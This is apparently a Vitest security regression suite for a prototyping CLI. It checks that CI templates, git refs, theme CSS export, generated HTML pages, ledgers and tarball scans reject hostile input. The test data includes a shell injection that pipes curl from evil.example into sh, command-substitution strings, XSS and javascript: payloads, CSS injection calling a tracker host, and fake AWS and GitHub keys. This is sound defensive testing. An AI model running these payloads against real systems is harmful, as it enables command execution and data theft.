// @vitest-environment node
import { mkdtempSync, readFileSync, realpathSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, resolve } from 'node:path';
import { loadEmbeddedApp } from '@protoyard/blueprint/kinds/embed';
import type { Theme } from '@protoyard/core';
import { violetTheme } from '@protoyard/themes';
import { afterAll, describe, expect, it } from 'vitest';
import { hygieneFindings } from '../../../scripts/check-packages.ts';
import { scanTarballFiles } from '../../../scripts/lib/tarball-hygiene.ts';
import { parseShowcaseSite } from '../src/commands/showcase.ts';
import { assertSafeGitRef } from '../src/lib/affected.ts';
import { renderTemplate } from '../src/lib/ci-templates.ts';
import { CliError } from '../src/lib/output.ts';
import { LEDGER_FORMAT, parseLedgerEntry } from '../src/lib/publish-ledger.ts';
import {
  type CompareModel,
  renderComparePage,
  safeRelativeUrl,
} from '../src/lib/quick/compare-html.ts';
import { createQuickRecord, parseQuickRecord, type QuickRecord } from '../src/lib/quick/model.ts';
import {
  escapeHtml,
  REVIEW_FORMAT,
  type ReviewEntry,
  renderReviewIndex,
} from '../src/lib/review-index-html.ts';
import { parseShareLedgerEntry, SHARE_LEDGER_FORMAT } from '../src/lib/share-ledger.ts';
import { exportTheme } from '../src/lib/theme-export.ts';

/**
 * Security regressions from command areas whose other tests were pruned
 * (PLAN_009). Each case keeps the essential assertion of the original guard:
 * injection into CI templates and git refs, credential-shaped ledger fields,
 * HTML escaping of untrusted labels, unsafe links, secrets in tarballs, CSS
 * injection through themes and nested embeds in untrusted blueprints.
 */

const HOSTILE = `<script>alert("x")</script><img src=x onerror=alert(1)>'"&`;
const AWS = `AKIA${'Q'.repeat(16)}`;
const GITHUB = `ghp_${'a'.repeat(36)}`;
const PRIVATE_KEY = ['-----BEGIN', 'RSA PRIVATE KEY-----'].join(' ');
const bytes = (text: string) => new TextEncoder().encode(text);
const files = (entries: Record<string, string>) =>
  new Map(Object.entries(entries).map(([path, v]) => [path, bytes(v)]));

const roots: string[] = [];
afterAll(() => {
  for (const root of roots) rmSync(root, { recursive: true, force: true });
});

function expectInvalidQuick(value: unknown, message: RegExp) {
  let error: unknown;
  try {
    parseQuickRecord(value);
  } catch (caught) {
    error = caught;
  }
  expect(error).toBeInstanceOf(CliError);
  expect((error as CliError).code).toBe('validation');
  expect((error as CliError).message).toMatch(message);
}

describe('injection into generated files and commands', () => {
  it('ci init refuses a PROTOTYPES value that is not a slug list (shell or YAML injection)', () => {
    const placeholders = { NODE_VERSION: '24', PROTOTYPES: 'alpha-app', PROVIDER: 'cloudflare' };
    for (const bad of [
      "crm-demo'; curl https://evil.example | sh; '",
      'a,b\n  run: x',
      'a, b',
      '$(id)',
    ]) {
      expect(
        () => renderTemplate('list={{PROTOTYPES}}', { ...placeholders, PROTOTYPES: bad }),
        bad
      ).toThrow(CliError);
    }
  });

  it('affected refuses empty, option-like, range and shell-tainted git refs', () => {
    for (const bad of ['', '  ', '-r', 'main;rm', 'a b', 'main$(x)', 'main`x`', 'a..b', 'a&b']) {
      expect(() => assertSafeGitRef(bad), bad).toThrow(CliError);
    }
  });

  it('theme export refuses values that would inject CSS', () => {
    const cases: Array<[string, Theme]> = [
      [
        'font',
        {
          ...violetTheme,
          fontFamily: 'x;} body{background:url(https://tracker.example/p)} :root{a:b',
        },
      ],
      ['color', { ...violetTheme, light: { ...violetTheme.light, primary: 'url(https://x)' } }],
      ['radius', { ...violetTheme, radius: '1rem;}body{display:none' }],
      ['markup', { ...violetTheme, dark: { ...violetTheme.dark, ring: '</style>' } }],
    ];
    for (const [name, theme] of cases) {
      expect(() => exportTheme(theme, 'css'), name).toThrow(/Refusing to export/);
    }
  });

  it('an embedded app payload carrying a nested embed marker fails the strict app schema', () => {
    const validApp = JSON.parse(
      readFileSync(
        resolve(process.cwd(), 'packages/player/src/fixtures/demo.blueprint.json'),
        'utf8'
      )
    ) as Record<string, unknown>;
    expect(loadEmbeddedApp(validApp).success).toBe(true);
    const nested = structuredClone(validApp);
    nested.untrustedContent = { type: 'embed-app' };
    expect(loadEmbeddedApp(nested)).toMatchObject({
      success: false,
      issues: [{ code: 'invalid-blueprint' }],
    });
  });
});

describe('credential-shaped fields never reach a ledger or record', () => {
  it('publish and share ledgers, and quick.json, refuse credential-like keys', () => {
    const entry = {
      format: LEDGER_FORMAT,
      formatVersion: 1,
      at: '2026-10-18T09:30:00.000Z',
      slug: 'crm-demo',
      provider: 'cloudflare',
      kind: 'dry-run',
      dryRun: true,
      target: 'preview',
      branch: null,
      project: 'protoyard-crm-demo',
      url: null,
      deploymentId: null,
      commit: null,
      dirty: null,
      buildSha256: 'a'.repeat(64),
      fileCount: 6,
      totalBytes: 1200,
      zip: null,
      zipSha256: null,
    };
    for (const key of ['token', 'CLOUDFLARE_API_TOKEN', 'secret', 'apiKey', 'password']) {
      expect(() => parseLedgerEntry({ ...entry, [key]: 'x' }), key).toThrow(
        /look like credentials/
      );
    }
    expect(() => parseLedgerEntry({ ...entry, details: { authToken: 'x' } })).toThrow(
      /details\.authToken/
    );

    const share = {
      format: SHARE_LEDGER_FORMAT,
      formatVersion: 1,
      at: '2026-10-19T12:00:00.000Z',
      slug: 'share-app',
      kind: 'artifact',
      url: 'https://claude.ai/artifact/abc-123',
      visibility: 'private',
      buildSha256: 'a'.repeat(64),
      fileCount: 2,
      commit: null,
      dirty: null,
      capabilities: ['db', 'user'],
    };
    expect(parseShareLedgerEntry(share)).toEqual(share);
    expect(() => parseShareLedgerEntry({ ...share, accessToken: 'x' })).toThrow(/credential/i);
    expect(() =>
      parseShareLedgerEntry({ ...share, url: 'https://example.com/artifact/x' })
    ).toThrow();

    const record: QuickRecord = createQuickRecord({
      slug: 'field-visits',
      brief: 'A fictional field service team schedules inspections.',
      blueprintSha256: 'a'.repeat(64),
      player: { version: '1.0.0', standalone: false },
      now: () => new Date('2026-10-20T12:00:00.000Z'),
    });
    expectInvalidQuick({ ...record, apiToken: 'x' }, /credentials/);
    expectInvalidQuick(
      {
        ...record,
        variants: [{ id: 'v1', label: 'x', dir: '../v1', blueprintSha256: 'b'.repeat(64) }],
      },
      /variants/
    );
  });
});

describe('untrusted labels and links in generated HTML', () => {
  it('the review index escapes every manifest string and never emits a script', () => {
    const url = 'https://abcdef12.protoyard-alpha-app.pages.dev/';
    const entry: ReviewEntry = {
      slug: 'alpha-app',
      name: '<script>alert(1)</script>',
      description: 'Tom & "Jerry" <img src=x onerror=alert(1)>',
      icon: '<b>',
      deployment: {
        url,
        target: 'preview',
        branch: 'pr-7',
        provider: 'cloudflare',
        at: '2026-10-18T09:30:00.000Z',
        commit: 'a'.repeat(40),
        dirty: false,
      },
      scenarioLinks: [],
      personaLinks: [],
      publishCommand: 'pnpm protoyard publish alpha-app --provider cloudflare',
    };
    const html = renderReviewIndex({
      format: REVIEW_FORMAT,
      formatVersion: 1,
      title: 'Prototype review',
      base: './',
      entries: [entry],
    });
    expect(html).not.toMatch(/<script/i);
    expect(html).not.toContain('<img');
    expect(html).toContain('&lt;script&gt;alert(1)&lt;/script&gt;');
    expect(escapeHtml(`'`)).toBe('&#39;');
  });

  it('the quick compare page escapes hostile labels and never links outside its folder', () => {
    const bad = [
      'javascript:alert(1)',
      'JaVaScRiPt:alert(1)',
      'data:text/html,<b>x</b>',
      'https://example.com/v1/',
      '//example.com/v1/',
      '/etc/passwd',
      '../other/v1/',
      'v1/../../x',
      'v1\\x',
      'v1/\u0000',
      '',
    ];
    const model: CompareModel = {
      title: HOSTILE,
      brief: HOSTILE,
      variants: bad.map((href, i) => ({
        id: `v${(i % 8) + 1}`,
        label: HOSTILE,
        href,
        screenshot: { path: href, width: 10, height: 10 },
      })),
    };
    const html = renderComparePage(model);
    expect(html).not.toContain('<script');
    expect(html).not.toContain('<img src=x');
    expect(html.replace(/"[^"]*"/g, '""')).not.toMatch(/<[^>]*\sonerror=/);
    expect([...html.matchAll(/\s(?:src|href)="([^"]*)"/g)]).toEqual([]);
    for (const href of bad) expect(safeRelativeUrl(href), href).toBeNull();
  });

  it('showcase --site refuses plain http, paths, queries, credentials and non-URLs', () => {
    for (const bad of [
      'http://protoyard.app',
      'https://protoyard.app/sub/',
      'https://protoyard.app/?x=1',
      'https://user:pass@protoyard.app',
      'javascript:alert(1)',
      'protoyard.app',
    ]) {
      expect(() => parseShowcaseSite(bad), bad).toThrow(/--site/);
    }
  });
});

describe('secrets in packed tarballs', () => {
  it('reports planted secrets by path, line and rule, never echoing the matched text', () => {
    expect(
      scanTarballFiles(
        files({
          'dist/index.js': `export const a = 1;\nexport const b = 2;\nconst k = "${AWS}";\n`,
          'dist/gh.js': `// ${GITHUB}\n`,
          'dist/key.txt': `${PRIVATE_KEY}\n`,
        })
      )
    ).toEqual([
      { path: 'dist/gh.js', line: 1, rule: 'secret-github' },
      { path: 'dist/index.js', line: 3, rule: 'secret-aws' },
      { path: 'dist/key.txt', line: 1, rule: 'secret-private-key' },
    ]);
    const root = realpathSync(mkdtempSync(join(tmpdir(), 'protoyard-hygiene-noallow-')));
    roots.push(root);
    expect(
      hygieneFindings(files({ 'dist/index.js': `const k = "${AWS}";` }), 'packages/demo', root)
    ).toEqual([{ rule: 'hygiene', message: 'dist/index.js:1: secret-aws' }]);
  });
});
